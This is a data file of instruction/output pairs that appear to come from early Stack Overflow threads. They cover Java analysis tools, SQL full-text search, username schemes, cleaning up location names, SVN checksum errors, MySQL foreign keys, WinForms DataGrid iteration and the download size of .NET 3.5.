{"instruction": "What code analysis tools do you use on your Java projects?\nI am interested in all kinds\n\nstatic code analysis tools (FindBugs, PMD, and any others)\ncode coverage tools (Cobertura, Emma, and any others)\nany other instrumentation-based tools \nanything else, if I'm missing something\n\nIf applicable, also state what build tools you use and how well these tools integrate with both your IDEs and build tools. \nIf a tool is only available a specific way (as an IDE plugin, or, say, a build tool plugin) that information is also worth noting.", "output": "I am looking for many answers to learn about new tools and consolidate this knowledge in a one question/thread, so I doubt there will be 1 true answer to this question.\nMy answer to my own question is that we use:\n\nFindbugs to look for common errors bad/coding - run from maven, and also integrates easily into Eclipse\nCobertura for our coverage reports - run from maven\n\nHudson also has a task-scanner plugin that will display a count of your TODO and FIXMEs, as well as show where they are in the source files.\nAll are integrated with Maven 1.x in our case and tied into Hudson, which runs our builds on check-in as well as extra things nightly and weekly. Hudson trend graphs our JUnit tests, coverage, findbugs, as well as open tasks. There is also a Hudson plugin that reports and graphs our compile warnings. We also have several performance tests with their own graphs of performance and memory use over time using the Hudson plots plugin as well."}
{"instruction": "Note: I am using SQL's Full-text search capabilities, CONTAINS clauses and all - the * is the wildcard in full-text, % is for LIKE clauses only.\nI've read in several places now that \"leading wildcard\" searches (e.g. using \"*overflow\" to match \"stackoverflow\") is not supported in MS SQL.  I'm considering using a CLR function to add regex matching, but I'm curious to see what other solutions people might have.\nMore Info: You can add the asterisk only at the end of the word or phrase. - along with my empirical experience:  When matching \"myvalue\", \"my*\" works, but \"(asterisk)value\" returns no match, when doing a query as simple as:\nSELECT * FROM TABLENAME WHERE CONTAINS(TextColumn, '\"*searchterm\"');\n\nThus, my need for a workaround.  I'm only using search in my site on an actual search page - so it needs to work basically the same way that Google works (in the eyes on a Joe Sixpack-type user). Not nearly as complicated, but this sort of match really shouldn't fail.", "output": "When it comes to full-text searching, for my money nothing beats Lucene.  There is a .Net port available that is compatible with indexes created with the Java version.\nThere's a little work involved in that you have to create/maintain the indexes, but the search speed is fantastic and you can create all sorts of interesting queries.  Even indexing speed is pretty good - we just completely rebuild our indexes once a day and don't worry about updating them.\nAs an example, this search functionality is powered by Lucene.Net."}
{"instruction": "We are in the early design stages of a major rewrite of our product. Right now our customers are mostly businesses. We manage accounts. User names for an account are each on their own namespace but it means that we can't move assets between servers.\nWe want to move to a single namespace. But that brings the problem of unique user names.\nSo what's the best idea?\n\nEmail address (w/verification) ?\nUnique alpha-numeric string (\"johnsmith9234\")?\nShould we look at OpenID?", "output": "OpenID seems to be a very good alternative to writing your own user management/authentication piece.  I'm seeing more and more sites using OpenID these days, so the barrier to entry for your users should be relatively low."}
{"instruction": "We are in the early design stages of a major rewrite of our product. Right now our customers are mostly businesses. We manage accounts. User names for an account are each on their own namespace but it means that we can't move assets between servers.\nWe want to move to a single namespace. But that brings the problem of unique user names.\nSo what's the best idea?\n\nEmail address (w/verification) ?\nUnique alpha-numeric string (\"johnsmith9234\")?\nShould we look at OpenID?", "output": "I like OpenID, but I'd still go with the email address, unless your user community is very technically savvy. It's still much easier for most people to understand and remember."}
{"instruction": "We are in the early design stages of a major rewrite of our product. Right now our customers are mostly businesses. We manage accounts. User names for an account are each on their own namespace but it means that we can't move assets between servers.\nWe want to move to a single namespace. But that brings the problem of unique user names.\nSo what's the best idea?\n\nEmail address (w/verification) ?\nUnique alpha-numeric string (\"johnsmith9234\")?\nShould we look at OpenID?", "output": "EMAIL ADDRESS\nRational\n\nUsers don't change emails very often\nRemoves the step of asking for username and email address, which you'll need anyway\nUsers don't often forget their email address (see number one)\nEmail will be unique unless the user already registered for the site, in which case forward them to a forgot your password screen\nAlmost everyone is using email as the primary login for access to a website, this means the rate of adoption shouldn't be affected by the fact that you're asking for an email address\n\n\nUpdate\nAfter registration, be sure to ask the user to create some kind of username, don't litter a public site with their email address! Also, another benefit of using an email address as a login: you won't need any other information (like password / password confirm), just send them a temp password through the mail, or forgo passwords altogether and send them a one-use URL to their email address every time they'd like to login (see: mugshot.org)"}
{"instruction": "We are in the early design stages of a major rewrite of our product. Right now our customers are mostly businesses. We manage accounts. User names for an account are each on their own namespace but it means that we can't move assets between servers.\nWe want to move to a single namespace. But that brings the problem of unique user names.\nSo what's the best idea?\n\nEmail address (w/verification) ?\nUnique alpha-numeric string (\"johnsmith9234\")?\nShould we look at OpenID?", "output": "I personally would say Email w/ Verification, OpenId is a great idea but I find that finding a provider that your already with is a pain, I only had an openId for here cause just 2 days before beta i decided to start a blog on blogspot. But everyone on the internet has en email address, especially when dealing with businesses, people aren't very opt to using there personal blog or whatnot for a business login."}
{"instruction": "We are in the early design stages of a major rewrite of our product. Right now our customers are mostly businesses. We manage accounts. User names for an account are each on their own namespace but it means that we can't move assets between servers.\nWe want to move to a single namespace. But that brings the problem of unique user names.\nSo what's the best idea?\n\nEmail address (w/verification) ?\nUnique alpha-numeric string (\"johnsmith9234\")?\nShould we look at OpenID?", "output": "I think that OpenID is definitely worth looking at.  Besides giving you a framework in which to provide a unified id for customers, it can also provide large businesses with the ability to manage their own logins and provide a common login across all products that they use, including your own.  This isn't that large of a benefit now when OpenId is still relatively rare, but as more products begin to use it, I suspect that the ability to use a common company OpenId login for each employee could become a good selling point.\nSince you're mostly catering to businesses, I don't think that it's all that unreasonable to offer to host the OpenId accounts yourself.  I just think that the extra flexibility will benefit your customers."}
{"instruction": "We are in the early design stages of a major rewrite of our product. Right now our customers are mostly businesses. We manage accounts. User names for an account are each on their own namespace but it means that we can't move assets between servers.\nWe want to move to a single namespace. But that brings the problem of unique user names.\nSo what's the best idea?\n\nEmail address (w/verification) ?\nUnique alpha-numeric string (\"johnsmith9234\")?\nShould we look at OpenID?", "output": "OpenID is very slick, and something you should seriously consider as it basically removes the requirement to save local usernames and passwords and worry about authentication.\nA lot of sites nowadays are using both OpenID and their own, giving users the option.\nIf you do decide to roll your own, I'd recommend using the email address. Be careful, though, if you are creating something that groups users by an account (say, a company that has several users). In this case, the email address might be used more than once (if they do work for more than one company, for example), and you should allow that.\nHTH!"}
{"instruction": "We are in the early design stages of a major rewrite of our product. Right now our customers are mostly businesses. We manage accounts. User names for an account are each on their own namespace but it means that we can't move assets between servers.\nWe want to move to a single namespace. But that brings the problem of unique user names.\nSo what's the best idea?\n\nEmail address (w/verification) ?\nUnique alpha-numeric string (\"johnsmith9234\")?\nShould we look at OpenID?", "output": "If most of your customers are mostly businesses then I think that using anything other than email creates problems for your customers. Most people are comfortable with email address login and since they are a business customer will likely want to use their work email rather than a personal account. OpenID creates a situation where there is a third party involved and many businesses don't like a third party involved."}
{"instruction": "I've been handed a table with about 18000 rows. Each record describes the location of one customer. The issue is, that when the person created the table, they did not add a field for \"Company Name\", only \"Location Name,\" and one company can have many locations.\nFor example, here are some records that describe the same customer:\nLocation Table\n ID  Location_Name     \n 1   TownShop#1        \n 2   Town Shop - Loc 2 \n 3   The Town Shop     \n 4   TTS - Someplace   \n 5   Town Shop,the 3   \n 6   Toen Shop4        \n\nMy goal is to make it look like:\nLocation Table\n ID  Company_ID   Location_Name     \n 1   1            Town Shop#1       \n 2   1            Town Shop - Loc 2 \n 3   1            The Town Shop     \n 4   1            TTS - Someplace   \n 5   1            Town Shop,the 3   \n 6   1            Toen Shop4        \n\nCompany Table\n Company_ID  Company_Name  \n 1           The Town Shop \n\nThere is no \"Company\" table, I will have to generate the Company Name list from the most descriptive or best Location Name that represents the multiple locations.\nCurrently I am thinking I need to generate a list of Location Names that are similar, and then and go through that list by hand.\nAny suggestions on how I can approach this is appreciated.\n@Neall, Thank you for your statement, but unfortunately, each location name is distinct, there are no duplicate location names, only similar. So in the results from your statement \"repcount\" is 1 in each row.\n@yukondude, Your step 4 is the heart of my question.", "output": "I've had to do this before. The only real way to do it is to manually match up the various locations. Use your database's console interface and grouping select statements. First, add your \"Company Name\" field. Then:\nSELECT count(*) AS repcount, \"Location Name\" FROM mytable WHERE \"Company Name\" IS NULL GROUP BY \"Location Name\" ORDER BY repcount DESC LIMIT 5;\nFigure out what company the location at the top of the list belongs to and then update your company name field with an UPDATE ... WHERE \"Location Name\" = \"The Location\" statement.\nP.S. - You should really break your company names and location names out into separate tables and refer to them by their primary keys.\nUpdate: - Wow - no duplicates? How many records do you have?"}
{"instruction": "I've been handed a table with about 18000 rows. Each record describes the location of one customer. The issue is, that when the person created the table, they did not add a field for \"Company Name\", only \"Location Name,\" and one company can have many locations.\nFor example, here are some records that describe the same customer:\nLocation Table\n ID  Location_Name     \n 1   TownShop#1        \n 2   Town Shop - Loc 2 \n 3   The Town Shop     \n 4   TTS - Someplace   \n 5   Town Shop,the 3   \n 6   Toen Shop4        \n\nMy goal is to make it look like:\nLocation Table\n ID  Company_ID   Location_Name     \n 1   1            Town Shop#1       \n 2   1            Town Shop - Loc 2 \n 3   1            The Town Shop     \n 4   1            TTS - Someplace   \n 5   1            Town Shop,the 3   \n 6   1            Toen Shop4        \n\nCompany Table\n Company_ID  Company_Name  \n 1           The Town Shop \n\nThere is no \"Company\" table, I will have to generate the Company Name list from the most descriptive or best Location Name that represents the multiple locations.\nCurrently I am thinking I need to generate a list of Location Names that are similar, and then and go through that list by hand.\nAny suggestions on how I can approach this is appreciated.\n@Neall, Thank you for your statement, but unfortunately, each location name is distinct, there are no duplicate location names, only similar. So in the results from your statement \"repcount\" is 1 in each row.\n@yukondude, Your step 4 is the heart of my question.", "output": "Please update the question, do you have a list of CompanyNames available to you? I ask because you maybe able to use Levenshtein algo to find a relationship between your list of CompanyNames and LocationNames.\n\nUpdate\n\nThere is not a list of Company Names, I will have to generate the company name from the most descriptive or best Location Name that represents the multiple locations.\n\nOkay... try this:\n\nBuild a list of candidate CompanyNames by finding LocationNames made up of mostly or all alphabetic characters. You can use regular expressions for this. Store this list in a separate table.\nSort that list alphabetically and (manually) determine which entries should be CompanyNames.\nCompare each CompanyName to each LocationName and come up with a match score (use Levenshtein or some other string matching algo). Store the result in a separate table.\nSet a threshold score such that any MatchScore < Threshold will not be considered a match for a given CompanyName.\nManually vet through the LocationNames by CompanyName | LocationName | MatchScore, and figure out which ones actually match. Ordering by MatchScore should make the process less painful.\n\nThe whole purpose of the above actions is to automate parts and limit the scope of your problem. It's far from perfect, but will hopefully save you the trouble of going through 18K records by hand."}
{"instruction": "I've been handed a table with about 18000 rows. Each record describes the location of one customer. The issue is, that when the person created the table, they did not add a field for \"Company Name\", only \"Location Name,\" and one company can have many locations.\nFor example, here are some records that describe the same customer:\nLocation Table\n ID  Location_Name     \n 1   TownShop#1        \n 2   Town Shop - Loc 2 \n 3   The Town Shop     \n 4   TTS - Someplace   \n 5   Town Shop,the 3   \n 6   Toen Shop4        \n\nMy goal is to make it look like:\nLocation Table\n ID  Company_ID   Location_Name     \n 1   1            Town Shop#1       \n 2   1            Town Shop - Loc 2 \n 3   1            The Town Shop     \n 4   1            TTS - Someplace   \n 5   1            Town Shop,the 3   \n 6   1            Toen Shop4        \n\nCompany Table\n Company_ID  Company_Name  \n 1           The Town Shop \n\nThere is no \"Company\" table, I will have to generate the Company Name list from the most descriptive or best Location Name that represents the multiple locations.\nCurrently I am thinking I need to generate a list of Location Names that are similar, and then and go through that list by hand.\nAny suggestions on how I can approach this is appreciated.\n@Neall, Thank you for your statement, but unfortunately, each location name is distinct, there are no duplicate location names, only similar. So in the results from your statement \"repcount\" is 1 in each row.\n@yukondude, Your step 4 is the heart of my question.", "output": "I was going to recommend some complicated token matching algorithm but it's really tricky to get right and if you're data does not have a lot of correlation (typos, etc) then it's not going to give very good results.\nI would recommend you submit a job to the Amazon Mechanical Turk and let a human sort it out."}
{"instruction": "I've been handed a table with about 18000 rows. Each record describes the location of one customer. The issue is, that when the person created the table, they did not add a field for \"Company Name\", only \"Location Name,\" and one company can have many locations.\nFor example, here are some records that describe the same customer:\nLocation Table\n ID  Location_Name     \n 1   TownShop#1        \n 2   Town Shop - Loc 2 \n 3   The Town Shop     \n 4   TTS - Someplace   \n 5   Town Shop,the 3   \n 6   Toen Shop4        \n\nMy goal is to make it look like:\nLocation Table\n ID  Company_ID   Location_Name     \n 1   1            Town Shop#1       \n 2   1            Town Shop - Loc 2 \n 3   1            The Town Shop     \n 4   1            TTS - Someplace   \n 5   1            Town Shop,the 3   \n 6   1            Toen Shop4        \n\nCompany Table\n Company_ID  Company_Name  \n 1           The Town Shop \n\nThere is no \"Company\" table, I will have to generate the Company Name list from the most descriptive or best Location Name that represents the multiple locations.\nCurrently I am thinking I need to generate a list of Location Names that are similar, and then and go through that list by hand.\nAny suggestions on how I can approach this is appreciated.\n@Neall, Thank you for your statement, but unfortunately, each location name is distinct, there are no duplicate location names, only similar. So in the results from your statement \"repcount\" is 1 in each row.\n@yukondude, Your step 4 is the heart of my question.", "output": "Ideally, you'd probably want a separate table named Company and then a company_id column in this \"Location\" table that is a foreign key to the Company table's primary key, likely called id. That would avoid a fair bit of text duplication in this table (over 18,000 rows, an integer foreign key would save quite a bit of space over a varchar column).\nBut you're still faced with a method for loading that Company table and then properly associating it with the rows in Location. There's no general solution, but you could do something along these lines:\n\nCreate the Company table, with an id column that auto-increments (depends on your RDBMS).\nFind all of the unique company names and insert them into Company.\nAdd a column, company_id, to Location that accepts NULLs (for now) and that is a foreign key of the Company.id column.\nFor each row in Location, determine the corresponding company, and UPDATE that row's company_id column with that company's id. This is likely the most challenging step. If your data is like what you show in the example, you'll likely have to take many runs at this with various string matching approaches.\nOnce all rows in Location have a company_id value, then you can ALTER the Company table to add a NOT NULL constraint to the company_id column (assuming that every location must have a company, which seems reasonable).\n\nIf you can make a copy of your Location table, you can gradually build up a series of SQL statements to populate the company_id foreign key. If you make a mistake, you can just start over and rerun the script up to the point of failure."}
{"instruction": "I'm using subclipse in Flex Builder 3, and recently received this error when trying to commit:\nsvn: Checksum mismatch for '/Users/redacted/Documents/Flex Builder 3/path/to/my/file.mxml'; expected: 'f8cb275de72776657406154dd3c10348', actual: 'null'\nI worked around it by:\n\nCommitting all the other changed files, omitting the troublesome one.\nCopying the contents of the trouble file to a TextMate window\nDeleting my project in FlexBuilder/Eclipse\nChecking my project out fresh from SVN\nCopying the text of the trouble file back in from the TextMate Window\nCommitting the changes.\n\nIt worked, but I can't help but think there's a better way. What's actaully happening to cause the svn:checksum error, and what's the best fix.\nMaybe more important -- is this a symptom of a greater problem?", "output": "The file in the .svn directory that keeps track of what you have checked out, when, what revision, and from where, has gotten corrupted somehow, for that particular file.\nThis is no more dangerous or critical than the normal odd file problem, and can be because of various problems, like a subversion program dying mid-change, power-disruption, etc.\nUnless it happens more I wouldn't make much out of it.\nIt can be fixed by doing what you did, make a copy of your work-files, check out a fresh copy, and add the modified files back in.\nNote that this might cause problems if you have a busy project where you would normally have to merge in changes.\nFor instance, you and a collegue both check out a fresh copy, and start working on the same file. At some point, your collegue checks in his modifications. When you attempt to do the same, you get the checksum problem you have. If you now make copies of your changed files, do a fresh checkout, then subversion will lose track of how your changes should be merged back in.\nIf you didn't get the problem in this case, when you got around to checkin in your modifications, you would need to update your working copy first, and possibly handle a conflict with your file.\nHowever, if you do a fresh checkout, complete with your collegues changes, it now looks like you removed his changes and substituted with your own. No conflicts, and no indications from subversion that something is amiss."}
{"instruction": "In a .net system I'm building, there is a need for automated e-mail notifications. These should be editable by an admin. What's the easiest way to do this? SQL table and WYSIWIG for editing?\n\nThe queue is a great idea. I've been throwing around that type of process for awhile with my old company.", "output": "Are you just talking about the interface and storage, or the implementation of sending the emails as well?\nYes, a SQL table with FROM, TO, Subject, Body should work for storage and, heck, a textbox or even maybe a RichText box should work for editing.\nOr is this a web interface?\nFor actually sending it, check out the System.Web.Mail namespace, it's pretty self explanatory and easy to use :)"}
{"instruction": "In a .net system I'm building, there is a need for automated e-mail notifications. These should be editable by an admin. What's the easiest way to do this? SQL table and WYSIWIG for editing?\n\nThe queue is a great idea. I've been throwing around that type of process for awhile with my old company.", "output": "From a high level, yes.  :D  The main thing is some place to store the templates.  A database is a great option unless you're not already using one, then file systems work fine.\nWSIWIG editors (such as fckeditor) work well and give you some good options regarding the features that you allow.\nSome sort of token replacement system is also a good idea if you need it.  For example, if someone puts %FIRSTNAME% in the email template, the code that generates the email can do some simple pattern matching to replace known tokens with other known values that may be dynamic based on user or other circumstances."}
{"instruction": "In a .net system I'm building, there is a need for automated e-mail notifications. These should be editable by an admin. What's the easiest way to do this? SQL table and WYSIWIG for editing?\n\nThe queue is a great idea. I've been throwing around that type of process for awhile with my old company.", "output": "I am thinking that if these are automated notifications, then this means they are probably going out as a result of some type of event in your software. If this is a web based app, and you are going to have a number of these being sent out, then consider implementing an email queue rather than sending out an email on every event.\nA component can query the queue periodically and send out any pending items."}
{"instruction": "I've got a table that is supposed to track days and costs for shipping product from one vendor to another. We (brilliantly :p) stored both the shipping vendors (FedEx, UPS) with the product handling vendors (Think... Dunder Mifflin) in a \"VENDOR\" table. So, I have three columns in my SHIPPING_DETAILS table that all reference VENDOR.no. For some reason MySQL isn't letting me define all three as foreign keys. Any ideas?\nCREATE TABLE SHIPPING_GRID(  \n    id INT NOT NULL AUTO_INCREMENT PRIMARY KEY COMMENT 'Unique ID for each row',  \n    shipping_vendor_no INT(6) NOT NULL COMMENT 'Foreign key to VENDOR.no for the shipping vendor (vendors_type must be 3)',  \n    start_vendor_no INT(6) NOT NULL COMMENT 'Foreign key to VENDOR.no for the vendor being shipped from',  \n    end_vendor_no INT(6) NOT NULL COMMENT 'Foreign key to the VENDOR.no for the vendor being shipped to',  \n    shipment_duration INT(1) DEFAULT 1 COMMENT 'Duration in whole days shipment will take',  \n    price FLOAT(5,5) NOT NULL COMMENT 'Price in US dollars per shipment lbs (down to 5 decimal places)',  \n    is_flat_rate TINYINT(1) DEFAULT 0 COMMENT '1 if is flat rate regardless of weight, 0 if price is by lbs',  \n    INDEX (shipping_vendor_no),  \n    INDEX (start_vendor_no),  \n    INDEX (end_vendor_no),  \n    FOREIGN KEY (shipping_vendor_no) REFERENCES VENDOR (no),  \n    FOREIGN KEY (start_vendor_no) REFERENCES VENDOR (no),  \n    FOREIGN KEY (end_vendor_no) REFERENCES VENDOR (no)  \n) TYPE = INNODB;\n\nEdited to remove double primary key definition...\n\nYeah, unfortunately that didn't fix it though. Now I'm getting:\n\nCan't create table\n  './REMOVED MY DB NAME/SHIPPING_GRID.frm'\n  (errno: 150)\n\nDoing a phpinfo() tells me this for mysql:\n\nClient API version    5.0.45\n\nYes, the VENDOR.no is type int(6).", "output": "You defined the primary key twice. Try:\nCREATE TABLE SHIPPING_GRID(  \n    id INT NOT NULL AUTO_INCREMENT PRIMARY KEY COMMENT 'Unique ID for each row',  \n    shipping_vendor_no INT(6) NOT NULL COMMENT 'Foreign key to VENDOR.no for the shipping vendor (vendors_type must be 3)',  \n    start_vendor_no INT(6) NOT NULL COMMENT 'Foreign key to VENDOR.no for the vendor being shipped from',  \n    end_vendor_no INT(6) NOT NULL COMMENT 'Foreign key to the VENDOR.no for the vendor being shipped to',  \n    shipment_duration INT(1) DEFAULT 1 COMMENT 'Duration in whole days shipment will take',  \n    price FLOAT(5,5) NOT NULL COMMENT 'Price in US dollars per shipment lbs (down to 5 decimal places)',  \n    is_flat_rate TINYINT(1) DEFAULT 0 COMMENT '1 if is flat rate regardless of weight, 0 if price is by lbs',  \n    INDEX (shipping_vendor_no),  \n    INDEX (start_vendor_no),  \n    INDEX (end_vendor_no),  \n    FOREIGN KEY (shipping_vendor_no) REFERENCES VENDOR (no),  \n    FOREIGN KEY (start_vendor_no) REFERENCES VENDOR (no),  \n    FOREIGN KEY (end_vendor_no) REFERENCES VENDOR (no)  \n) TYPE = INNODB;\n\nThe VENDOR primary key must be INT(6), and both tables must be of type InnoDB."}
{"instruction": "I've got a table that is supposed to track days and costs for shipping product from one vendor to another. We (brilliantly :p) stored both the shipping vendors (FedEx, UPS) with the product handling vendors (Think... Dunder Mifflin) in a \"VENDOR\" table. So, I have three columns in my SHIPPING_DETAILS table that all reference VENDOR.no. For some reason MySQL isn't letting me define all three as foreign keys. Any ideas?\nCREATE TABLE SHIPPING_GRID(  \n    id INT NOT NULL AUTO_INCREMENT PRIMARY KEY COMMENT 'Unique ID for each row',  \n    shipping_vendor_no INT(6) NOT NULL COMMENT 'Foreign key to VENDOR.no for the shipping vendor (vendors_type must be 3)',  \n    start_vendor_no INT(6) NOT NULL COMMENT 'Foreign key to VENDOR.no for the vendor being shipped from',  \n    end_vendor_no INT(6) NOT NULL COMMENT 'Foreign key to the VENDOR.no for the vendor being shipped to',  \n    shipment_duration INT(1) DEFAULT 1 COMMENT 'Duration in whole days shipment will take',  \n    price FLOAT(5,5) NOT NULL COMMENT 'Price in US dollars per shipment lbs (down to 5 decimal places)',  \n    is_flat_rate TINYINT(1) DEFAULT 0 COMMENT '1 if is flat rate regardless of weight, 0 if price is by lbs',  \n    INDEX (shipping_vendor_no),  \n    INDEX (start_vendor_no),  \n    INDEX (end_vendor_no),  \n    FOREIGN KEY (shipping_vendor_no) REFERENCES VENDOR (no),  \n    FOREIGN KEY (start_vendor_no) REFERENCES VENDOR (no),  \n    FOREIGN KEY (end_vendor_no) REFERENCES VENDOR (no)  \n) TYPE = INNODB;\n\nEdited to remove double primary key definition...\n\nYeah, unfortunately that didn't fix it though. Now I'm getting:\n\nCan't create table\n  './REMOVED MY DB NAME/SHIPPING_GRID.frm'\n  (errno: 150)\n\nDoing a phpinfo() tells me this for mysql:\n\nClient API version    5.0.45\n\nYes, the VENDOR.no is type int(6).", "output": "I ran the code here, and the error message showed (and it is right!) that you are setting id field twice as primary key."}
{"instruction": "I've got a table that is supposed to track days and costs for shipping product from one vendor to another. We (brilliantly :p) stored both the shipping vendors (FedEx, UPS) with the product handling vendors (Think... Dunder Mifflin) in a \"VENDOR\" table. So, I have three columns in my SHIPPING_DETAILS table that all reference VENDOR.no. For some reason MySQL isn't letting me define all three as foreign keys. Any ideas?\nCREATE TABLE SHIPPING_GRID(  \n    id INT NOT NULL AUTO_INCREMENT PRIMARY KEY COMMENT 'Unique ID for each row',  \n    shipping_vendor_no INT(6) NOT NULL COMMENT 'Foreign key to VENDOR.no for the shipping vendor (vendors_type must be 3)',  \n    start_vendor_no INT(6) NOT NULL COMMENT 'Foreign key to VENDOR.no for the vendor being shipped from',  \n    end_vendor_no INT(6) NOT NULL COMMENT 'Foreign key to the VENDOR.no for the vendor being shipped to',  \n    shipment_duration INT(1) DEFAULT 1 COMMENT 'Duration in whole days shipment will take',  \n    price FLOAT(5,5) NOT NULL COMMENT 'Price in US dollars per shipment lbs (down to 5 decimal places)',  \n    is_flat_rate TINYINT(1) DEFAULT 0 COMMENT '1 if is flat rate regardless of weight, 0 if price is by lbs',  \n    INDEX (shipping_vendor_no),  \n    INDEX (start_vendor_no),  \n    INDEX (end_vendor_no),  \n    FOREIGN KEY (shipping_vendor_no) REFERENCES VENDOR (no),  \n    FOREIGN KEY (start_vendor_no) REFERENCES VENDOR (no),  \n    FOREIGN KEY (end_vendor_no) REFERENCES VENDOR (no)  \n) TYPE = INNODB;\n\nEdited to remove double primary key definition...\n\nYeah, unfortunately that didn't fix it though. Now I'm getting:\n\nCan't create table\n  './REMOVED MY DB NAME/SHIPPING_GRID.frm'\n  (errno: 150)\n\nDoing a phpinfo() tells me this for mysql:\n\nClient API version    5.0.45\n\nYes, the VENDOR.no is type int(6).", "output": "Can you provide the definition of the\n  VENDOR table\n\nI figured it out. The VENDOR table was MyISAM... (edited your answer to tell me to make them both INNODB ;) )\n(any reason not to just switch the VENDOR type over to INNODB?)"}
{"instruction": "I've been handed a table with about 18000 rows. Each record describes the location of one customer. The issue is, that when the person created the table, they did not add a field for \"Company Name\", only \"Location Name,\" and one company can have many locations.\nFor example, here are some records that describe the same customer:\nLocation Table\n ID  Location_Name     \n 1   TownShop#1        \n 2   Town Shop - Loc 2 \n 3   The Town Shop     \n 4   TTS - Someplace   \n 5   Town Shop,the 3   \n 6   Toen Shop4        \n\nMy goal is to make it look like:\nLocation Table\n ID  Company_ID   Location_Name     \n 1   1            Town Shop#1       \n 2   1            Town Shop - Loc 2 \n 3   1            The Town Shop     \n 4   1            TTS - Someplace   \n 5   1            Town Shop,the 3   \n 6   1            Toen Shop4        \n\nCompany Table\n Company_ID  Company_Name  \n 1           The Town Shop \n\nThere is no \"Company\" table, I will have to generate the Company Name list from the most descriptive or best Location Name that represents the multiple locations.\nCurrently I am thinking I need to generate a list of Location Names that are similar, and then and go through that list by hand.\nAny suggestions on how I can approach this is appreciated.\n@Neall, Thank you for your statement, but unfortunately, each location name is distinct, there are no duplicate location names, only similar. So in the results from your statement \"repcount\" is 1 in each row.\n@yukondude, Your step 4 is the heart of my question.", "output": "Yes, that step 4 from my previous post is a doozy.\nNo matter what, you're probably going to have to do some of this by hand, but you may be able to automate the bulk of it. For the example locations you gave, a query like the following would set the appropriate company_id value:\nUPDATE  LocationSET     Company_ID = 1WHERE   (LOWER(Location_Name) LIKE '%to_n shop%'OR      LOWER(Location_Name) LIKE '%tts%')AND     Company_ID IS NULL;\nI believe that would match your examples (I added the IS NULL part to not overwrite previously set Company_ID values), but of course in 18,000 rows you're going to have to be pretty inventive to handle the various combinations.\nSomething else that might help would be to use the names in Company to generate queries like the one above. You could do something like the following (in MySQL):\nSELECT  CONCAT('UPDATE Location SET Company_ID = ',        Company_ID, ' WHERE LOWER(Location_Name) LIKE ',        LOWER(REPLACE(Company_Name), ' ', '%'), ' AND Company_ID IS NULL;')FROM    Company;\nThen just run the statements that it produces. That could do a lot of the grunge work for you."}
{"instruction": "I'm suddenly back to WinForms, after years of web development, and am having trouble  with something that should be simple.  I have an ArrayList of business objects bound to a  Windows Forms DataGrid.  I'd like the user to be able to edit the cells, and when finished,  press a Save button.  At that point I'd like to iterate the all the rows and columns in the  DataGrid to find any changes, and save them to the database.  But I can't find a way to  access the DataGrid rows.  \nI'll also want to validate individual cells real time, as they are edited, but I'm pretty  sure that can be done.  (Maybe not with an ArrayList as the DataSource?)  But as for iterating the DataGrid, I'm quite surprised it doesn't seem possible.\nMust I really stuff my business objects data into datatables in order to use the datagrid?", "output": "foreach(var row in DataGrid1.Rows)\n{\n  DoStuff(row);\n}\n//Or ---------------------------------------------   \nforeach(DataGridRow row in DataGrid1.Rows)\n{\n  DoStuff(row);\n}\n//Or ---------------------------------------------\nfor(int i = 0; i< DataGrid1.Rows.Count - 1; i++)\n{\n  DoStuff(DataGrid1.Rows[i]);\n}"}
{"instruction": "I've been using a lot of new .NET 3.5 features in the work that I've been doing, lately. The application that I'm building is intended for distribution among consumers who will probably not have the latest version (or perhaps any version) of the .NET framework on their machines.\nI went to go download the .NET 3.5 redistributable package only to find out that it's almost 200 MB! This is unacceptable for my application, because it's supposed to be a quick and painless consumer application that installs quickly and keeps a low profile on the user's machine. For users that have .NET 3.5 already installed, our binary downloads have been instantaneous, so far. This 200 MB gorilla will more than quadruple the size of the download. Is there any other option than this redistributable package that I can use to make sure the framework is on the machine that won't take the user out of our \"quick and painless\" workflow? Our target time from beginning of download to finalizing the install is less than two minutes. Is it just not possible for someone who doesn't already have .NET installed?", "output": "That's one of the sad reasons i'm still targeting .net 2.0 whenever possible :/\nBut people don't neccessarily need the full 200 MB Package. There is a 3 MB Bootstrapper which will only download the required components:\n.net 3.5 SP1 Bootstrapper\nHowever, the worst case scenario is still a pretty hefty download. Also, see this article for a more detailed explanation on the size and an alternative workaround to the size problem.\nAddition: Since answering this question, Scott Hanselman created SmallestDotNet.com, which will determine the smallest required download. Doesn't change the worst case scenario, but is still useful to know."}
{"instruction": "I've been using a lot of new .NET 3.5 features in the work that I've been doing, lately. The application that I'm building is intended for distribution among consumers who will probably not have the latest version (or perhaps any version) of the .NET framework on their machines.\nI went to go download the .NET 3.5 redistributable package only to find out that it's almost 200 MB! This is unacceptable for my application, because it's supposed to be a quick and painless consumer application that installs quickly and keeps a low profile on the user's machine. For users that have .NET 3.5 already installed, our binary downloads have been instantaneous, so far. This 200 MB gorilla will more than quadruple the size of the download. Is there any other option than this redistributable package that I can use to make sure the framework is on the machine that won't take the user out of our \"quick and painless\" workflow? Our target time from beginning of download to finalizing the install is less than two minutes. Is it just not possible for someone who doesn't already have .NET installed?", "output": "Have you looked at the .NET Framework Client Profile? It is much smaller than the full redistributable package and is optimized for delivering just the functionality needed for smart clients.\nHere is a nice overview.\nI don't know if this will keep the download under two minutes or not, but it should get you quite a bit closer."}
{"instruction": "I've been using a lot of new .NET 3.5 features in the work that I've been doing, lately. The application that I'm building is intended for distribution among consumers who will probably not have the latest version (or perhaps any version) of the .NET framework on their machines.\nI went to go download the .NET 3.5 redistributable package only to find out that it's almost 200 MB! This is unacceptable for my application, because it's supposed to be a quick and painless consumer application that installs quickly and keeps a low profile on the user's machine. For users that have .NET 3.5 already installed, our binary downloads have been instantaneous, so far. This 200 MB gorilla will more than quadruple the size of the download. Is there any other option than this redistributable package that I can use to make sure the framework is on the machine that won't take the user out of our \"quick and painless\" workflow? Our target time from beginning of download to finalizing the install is less than two minutes. Is it just not possible for someone who doesn't already have .NET installed?", "output": "Also, it is worth including (in some fashion) the Service Pack downloads as well. In fact, depending on how your executables are built, you might be forced to install the Framework and the Service Packs."}
